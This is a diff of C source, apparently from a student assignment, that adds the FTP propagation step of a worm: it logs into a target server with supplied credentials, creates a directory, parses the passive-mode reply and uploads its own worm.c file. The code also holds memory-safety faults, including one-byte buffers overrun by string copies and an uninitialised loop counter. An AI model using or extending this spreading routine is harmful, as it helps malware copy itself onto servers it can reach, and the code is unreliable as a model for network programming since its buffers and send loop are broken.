@@ -13,34 +13,57 @@
 #include <dirent.h>
 #include <fcntl.h>
 
-void parseIPPort(char buffer[], char paramPORT[]){
+void parseIPPort(char buffer[], char *ip, int *port){
     char *token = (char*) malloc(sizeof(char));
     char *aux = (char*) malloc(sizeof(char));
-    int i = 0;
+    char *aux2 = (char*) malloc(sizeof(char));
+    char *ip_aux = (char*) malloc(sizeof(char));
+    char **range = malloc(2*sizeof(char *));
+    char *ponto = ".";
+    int i = 0, p1 = 0, p2 = 0;
     
     /* get the first token */
     token = strtok(buffer, " ");
-    printf("%s\n", aux);
    
     /* walk through other tokens */
     while(token != NULL) {
         aux = token;
-        printf("%s\n", token);
         token = strtok(NULL, " ");
     }
  
     /* get the first token */
     token = strtok(aux, "(");
-    aux = token;
-    token = strtok(aux, ")");
-    aux = token;
-    printf("%s\n", aux);
+    aux2 = strdup(token);
+    token = strtok(aux2, ")");
+    aux = strdup(token);
+    
+    /* get the first token */
+    token = strtok(aux, ",");
+   
+    while(token != NULL) {
+        range[i] = token;
+        token = strtok(NULL, ",");
+        i +=1;
+    }
 
+    for(i = 0; i < 3; i++){
+        strcpy(ip_aux, range[i]);
+        strcat(ip_aux, ponto);
+        strcat(ip, ip_aux);
+    }
+    
+    strcpy(ip_aux, range[i]);
+    strcat(ip, ip_aux);
+
+    p1 = atoi(range[i+1]);
+    p2 = atoi(range[i+2]);
+
+    *port = p1*256+p2;
 }
 
 void fileTransfer(char *ip, char *username, char *password){
-    char buffer[1024];
-    char paramPORT[50];
+    char buffer[1024], file_buf[512];
+    char *ipT = (char*) malloc(sizeof(char));
     char user[100] = "USER ";
     char pass[100] = "PASS ";
     char model[10] = "MODE S\n";
@@ -52,10 +75,11 @@ void fileTransfer(char *ip, char *username, char *password){
     char pwd[10] = "PWD\n";
     char mkd[20] = "MKD Asgn03KLG\n";
     char storWorm[25] = "STOR worm.c\n";
+    char c;
     DIR *dir;
     FILE *arq;
-    int sock = 0, len = 0, size = 0;
-    struct sockaddr_in serverAddr;
+    int i = 0, sent, tam_send = 0, temp, sock = 0, sockT, len = 0, status, size = 0, size2 = 0, port = 0, accept_socket;
+    struct sockaddr_in serverAddr, transfSock, server;
     struct dirent *folder;
     struct stat obj;
 
@@ -136,7 +160,7 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
-    //Enviando Passive Mode
+    //Enviando Passive Mode'
     memset(buffer, '0', 1024);
     send(sock, pasv, strlen(pasv), 0);
 
@@ -145,7 +169,8 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
-    parseIPPort(buffer, paramPORT);
+    //Parse para pegar IP e Porta
+    parseIPPort(buffer, ipT, &port);
 
     //Enviando comando 'CD'
     memset(buffer, '0', 1024);
@@ -192,16 +217,77 @@ void fileTransfer(char *ip, char *username, char *password){
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
-
+    
     //Enviando comando Worm.c
     memset(buffer, '0', 1024);
     send(sock, storWorm, strlen(storWorm), 0);
+
+    //CONNECT FTP
+    sockT = socket(AF_INET, SOCK_STREAM, 0);
+    if(sock < 0){
+        printf("Erro ao criar o socket.\n");
+        exit(1);
+    }  
+
+    memset(&transfSock, '0', sizeof(transfSock));
+    transfSock.sin_addr.s_addr = inet_addr(ipT);
+    transfSock.sin_family = AF_INET;
+    transfSock.sin_port = htons(port);
+
+    if(connect(sockT, (struct sockaddr*)&transfSock, sizeof(transfSock)) < 0){
+        //printf("Erro: conexao falhou. \n");
+        perror("");
+        exit(1);
+    }
+
+    if((arq = fopen("worm.c", "r")) == NULL){
+        printf("No such file on the local directory\n\n");
+        exit(0);
+    }
+   
+    status = stat("worm.c", &obj); 
+    size = obj.st_size;
+    temp = size;
+
+    printf("%d", size);
+    for(i=0; i<=9; i++ )   {
+        buffer[i] =  size%10;
+        size = size/10;
+        printf("%d", size);
+    }
     
+    if (send(sockT, buffer, 10, 0) == -1){
+        printf("Cant send file size...\n\n");
+        exit(1);
+    }
+
     //Resposta do Worm.c
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
+    memset(file_buf, '0', sizeof(file_buf));
+    
+    i = 0;
+
+    tam_send = temp / 10;
+    
+    while(sent <= temp){
+        while(i < tam_send){
+            c = fgetc(arq);
+            file_buf[i] = c;
+            i+=1;
+        }
+        if (send(sockT, file_buf, tam_send, 0) < 0)
+        sent++;
+        tam_send += tam_send;
+    }
+
+    //Resposta do Worm.c
+    bzero(buffer, 1024);
+    recv(sock, buffer, sizeof(buffer), 0);
+    printf("%s", buffer);
+ 
     if(sock >= 0){
         close(sock);
     }
